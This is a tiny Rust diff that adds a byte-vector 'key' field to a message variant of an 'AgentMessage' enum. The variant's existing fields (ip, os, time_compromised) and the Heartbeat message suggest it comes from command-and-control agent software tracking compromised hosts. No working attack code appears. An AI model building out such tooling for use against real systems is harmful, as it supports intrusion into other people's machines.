@@ -11,6 +11,7 @@ pub enum AgentMessage {
         ip: String,
         os: String,
         time_compromised: String,
+        key: Vec<u8>
     },
     Heartbeat {
         agent_id: u64,
